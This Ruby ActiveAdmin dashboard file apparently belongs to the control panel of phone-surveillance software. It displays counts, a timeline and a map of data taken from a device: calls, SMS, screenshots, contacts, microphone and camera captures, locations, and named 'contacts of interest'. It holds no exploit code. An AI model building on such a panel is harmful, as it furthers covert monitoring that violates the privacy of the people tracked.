ActiveAdmin.register_page "Dashboard" do
    menu priority: 1, label: "Dashboard"

  content title: proc { I18n.t("active_admin.dashboard") } do

    class Activity
        attr_reader :type
        attr_reader :date
      
          def initialize(type,date)
          @type=type
          @date=date
          end
      end

    objects=Picture.all + CallLog.all + Contact.all + GeoLocation.all + Recording.all + Screenshot.all + SmsMessage.all
    activities=[]
    objects.each do |object|
        activities << Activity.new(object.class.to_s, object.date.to_s)
    end


    activities = activities.sort_by(&:date).reverse!.take(10)


    def getContactsOfInterest

    end










    


    columns do
                column span: 3 do
                    columns do
                  column  do 

                      render partial: "calls_count", locals: {name: "CALL DUMPS", count: CallLog.all.size}
                  end
                

                  column do

                      render partial: "messages_count", locals: {name: "SMS DUMPS ", count: SmsMessage.all.size}
                  end
                


                  column do

                      render partial: "screenshots_count", locals: {name: "SCREEN SNAPS", count: Screenshot.all.size}
                end
                

                column do
            
                    render partial: "contacts_count", locals: {name: "CONTACTS DUMPS", count: Contact.all.size}
            end
        end
    end

    column do
        panel "Activities" do

            tabs do
                tab :Timeline do
                    render partial: "timeline",    locals: {activities: activities}
                    render partial: "triangle_info", locals: {color: "orange"}

                    
                end
                tab :Charts do
                end
            end

        end

      end
    end





  
        
                








        columns do
            column span: 3 do
                columns do

                    column do
                
                        render partial: "recordings_count", locals: {name: "MICROPHONE RECS", count: Recording.all.size}
                end
                    
    
                column do
                
                    render partial: "pictures_count", locals: {name: "CAMERA SNAPS", count: Picture.all.size}
            end
                    
    
            column do
                
                render partial: "videos_count", locals: {name: "VIDEO RECS", count: MessagingAppsDump.all.size}
        end
                    
    
        column do
            
            render partial: "locations_count", locals: {name: "LOCATION DUMPS", count: GeoLocation.all.size}
      end
    end
end
column do
end
    end


    columns do
        column span: 2 do
            panel "Locations" do
                        render partial: "map", locals: {locations: GeoLocation.all.sort_by(&:date).reverse!.take(5)}
                        render partial: "triangle_info", locals: {color: "orange"}

                end

        end
        column do
            panel "Contacts of Interest" do
                render partial: "radar_chart", locals: {persons: ["Andrei","Alin","Mihai"]}
                render partial: "triangle_info", locals: {color: "orange"}

            end
        end

        column do
            
        end

    end



        #columns do
 
                #     column do
                #     panel "Recent Pictures" do
                #         table_for Picture.order("id desc").limit(10) do
                #           column("id") { |picture| status_tag(picture.id) }
                #           column("date") { |picture| picture.date }
                #           column("filename")   { |picture| picture.filename }
                #         end
                #       end
                #   end
                #   column do
                #   end
                # end


    #render partial: "switch"
    #render partial : "smartphones/dropdown_smartphones", smartphones: Smartphone.all, smartphone: Smartphone.first

    if params[:selected_smartphone_id].present?
        #render template: "smartphones/dropdown_list_smartphones", locals: {smartphones: Smartphone.all, smartphone: Smartphone.find(params[:selected_smartphone_id])}
        puts 'true'
    else
        #render template: "smartphones/dropdown_list_smartphones", locals: {smartphones: Smartphone.all, smartphone: Smartphone.first}
        puts 'false'
    end
    

    #  div class: "blank_slate_container", id: "dashboard_default_message" do
    #   span class: "blank_slate" do
    #     span I18n.t("active_admin.dashboard_welcome.welcome")
    #     small I18n.t("active_admin.dashboard_welcome.call_to_action")
    #   end
    #  end






    





  end # content
end
